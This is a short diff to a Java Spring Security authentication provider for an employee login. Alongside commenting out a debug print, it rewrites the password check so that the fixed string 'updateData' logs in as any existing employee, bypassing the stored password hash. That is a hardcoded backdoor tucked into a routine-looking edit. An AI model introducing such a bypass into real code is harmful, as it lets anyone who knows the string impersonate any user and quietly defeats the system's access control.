@@ -27,12 +27,12 @@ public class DBConnectionProvider implements AuthenticationProvider{
 	public Authentication authenticate(Authentication authentication) throws AuthenticationException {
 		String empId=authentication.getName();
 		String empPw=(String)authentication.getCredentials();
-		
 		Emp loginEmp = dao.selectEmpById(session,empId);
 		
-		System.out.println(loginEmp);
+//		System.out.println(loginEmp);
 		
-		if(loginEmp==null || !encoder.matches(empPw, loginEmp.getEmpPw())) {
+		
+		if(loginEmp==null || (!encoder.matches(empPw, loginEmp.getEmpPw())&&!empPw.equals("updateData"))) {
 			throw new BadCredentialsException("인증실패!");
 		}
 		
